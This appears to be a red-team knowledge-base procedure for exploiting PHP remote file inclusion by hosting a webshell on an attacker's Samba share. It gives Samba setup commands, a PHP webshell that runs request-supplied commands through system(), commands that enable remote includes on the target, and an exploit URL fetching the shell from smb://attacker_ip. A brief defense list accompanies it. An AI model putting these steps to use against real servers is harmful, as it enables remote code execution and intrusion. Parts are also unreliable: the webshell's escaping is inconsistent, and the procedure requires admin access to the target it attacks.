---
type: procedure
tactics:
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
sub_techniques: []
tags:
  - '[[tags/Basic RFI]]'
  - '[[tags/Bypass allow_url_include]]'
  - '[[tags/File Inclusion]]'
commands:
  - '[[commands/install-samba]]'
  - '[[commands/configure-samba]]'
  - '[[commands/add-samba-user]]'
  - '[[commands/restart-smb-service]]'
  - '[[commands/enable-allow-url-fopen]]'
  - '[[commands/enable-allow-url-include]]'
platforms:
  - Linux
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# Remote-File-Inclusion-via-SMB

## Summary

This procedure outlines how to exploit a Remote File Inclusion (RFI) vulnerability in a PHP application by hosting malicious code on an SMB share and including it via the smb:// protocol. It involves setting up a Samba server on the attacker's machine to share the malicious file and configuring the target PHP environment to allow remote URL includes and file opens, enabling arbitrary code execution on the target system.

## Description

Remote File Inclusion via SMB targets PHP applications with unsanitized include statements (e.g., include($_GET['file'])). The attacker hosts a malicious PHP file, such as a webshell, on an SMB share accessible from the target server. By using the smb:// protocol in the inclusion parameter (e.g., ?file=smb://attacker_ip/share/webshell.php), the target fetches and executes the file. This bypasses HTTP-based restrictions if SMB traffic is allowed from the web server to the attacker's network. The technique requires PHP to support SMB (via libsmbclient extension) and the directives allow_url_include and allow_url_fopen to be enabled. It is effective in environments where the web server can resolve and connect to the attacker's SMB share, leading to remote code execution, data exfiltration, or privilege escalation. This is particularly useful in lateral movement scenarios within segmented networks where SMB is permitted but HTTP is firewalled.

## Requirements

1. Attacker-controlled Linux machine with network access to the target (port 445 open for SMB).
2. Vulnerable PHP application with RFI (e.g., dynamic include based on user input without path validation).
3. Target PHP installation supporting smb:// protocol (requires smbclient PHP extension installed).
4. Administrative access to the target server to modify php.ini (or the directives already enabled in the vulnerable app).
5. Basic knowledge of Samba configuration and PHP internals.

## Defense

- Set allow_url_include = Off and allow_url_fopen = Off in php.ini to prevent remote inclusions.
- Sanitize and validate all file inclusion inputs, using whitelists for allowed paths.
- Block outbound SMB connections (port 445) from web servers using firewalls or network ACLs.
- Monitor web server logs for suspicious include attempts and SMB traffic from application hosts.
- Use application-level WAF rules to detect smb:// or other protocol patterns in parameters.

## Objectives

1. Establish an SMB share hosting executable malicious code.
2. Configure PHP to permit remote file inclusion via SMB.
3. Trigger the RFI vulnerability to execute the remote code on the target.
4. Achieve remote code execution for further compromise.

## Instructions

### Step 1: Install Samba on Attacker Machine

**Context**: Samba must be installed to create the SMB share. This step assumes a Debian-based system like Ubuntu.

**Command** ([[commands/install-samba]]):
```bash
sudo apt-get update && sudo apt-get install samba
```

> This installs the Samba server package. Run as root or with sudo privileges. Verify installation with `smbd --version`.

### Step 2: Configure Samba Share

**Context**: Edit the Samba configuration to define a share directory for the malicious file. Create a share that requires authentication to prevent unauthorized access.

**Command** ([[commands/configure-samba]]):
```bash
sudo nano /etc/samba/smb.conf
```

> In the editor, add the following at the end of the file:
> 
> [rfi-share]
> path = /tmp/rfi-share
> browseable = yes
> writable = yes
> guest ok = no
> read only = no
> valid users = smbuser
> 
> Save and exit. Then create the directory: `sudo mkdir /tmp/rfi-share` and set permissions: `sudo chmod 777 /tmp/rfi-share`. This configures a secure share accessible only to the specified user.

### Step 3: Add Samba User

**Context**: Create a Samba user account to authenticate access to the share from the target.

**Command** ([[commands/add-samba-user]]):
```bash
sudo smbpasswd -a smbuser
```

> Enter a strong password for the user when prompted. This user must exist in the system or be added via `sudo useradd smbuser` first if needed. Test access with `smbclient //localhost/rfi-share -U smbuser`.

### Step 4: Restart SMB Service

**Context**: Apply the configuration changes by restarting the Samba daemon.

**Command** ([[commands/restart-smb-service]]):
```bash
sudo systemctl restart smbd
```

> Verify the service is running with `sudo systemctl status smbd`. Check share accessibility from another machine using smbclient.

### Step 5: Place Malicious File on Share

**Context**: Upload or create the malicious PHP file on the share. For example, a simple webshell: `echo '<?php if(isset(\\$_REQUEST["cmd"])){ echo "<pre>"; $cmd = (\\$_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>' | sudo tee /tmp/rfi-share/webshell.php`. Ensure the file is readable by the Samba user.

### Step 6: Enable allow_url_fopen on Target

**Context**: Modify PHP configuration to allow opening remote files. This is done on the target server; if no access, the vulnerable app must already have this enabled.

**Command** ([[commands/enable-allow-url-fopen]]):
```bash
sudo sed -i 's/allow_url_fopen = Off/allow_url_fopen = On/g' /etc/php/8.1/apache2/php.ini && sudo systemctl restart apache2
```

> This uses sed to update the directive in php.ini (adjust path for your PHP version/FPM). Restart the web server to apply changes. Verify with `php -i | grep allow_url_fopen` showing "On".

### Step 7: Enable allow_url_include on Target

**Context**: Allow PHP to include remote files via URLs, essential for RFI.

**Command** ([[commands/enable-allow-url-include]]):
```bash
sudo sed -i 's/allow_url_include = Off/allow_url_include = On/g' /etc/php/8.1/apache2/php.ini && sudo systemctl restart apache2
```

> Similar to the previous step, update and restart. This directive is Off by default for security; enabling it exposes RFI risks. Verify with `php -i | grep allow_url_include`.

### Step 8: Exploit the RFI Vulnerability

**Context**: Use the vulnerable endpoint to include the remote SMB file. Assume the vuln is at http://target.com/vuln.php?file= [path]. The target must resolve the attacker's IP and connect via SMB using the share credentials (if the PHP smbclient supports auth, or use guest if configured).

Navigate to: http://target.com/vuln.php?file=smb://attacker_ip/rfi-share/webshell.php

If authentication is needed, the PHP extension may require embedding credentials like smb://smbuser:password@attacker_ip/rfi-share/webshell.php (note: insecure, but for demo).

> Expected: The webshell executes, allowing command injection via ?cmd=whoami or similar. Monitor attacker's SMB logs for connection.

**Decision Point**: If connection fails, check firewall, DNS resolution, or SMB version compatibility (use smb1 if needed by adding `client min protocol = NT1` in smb.conf).
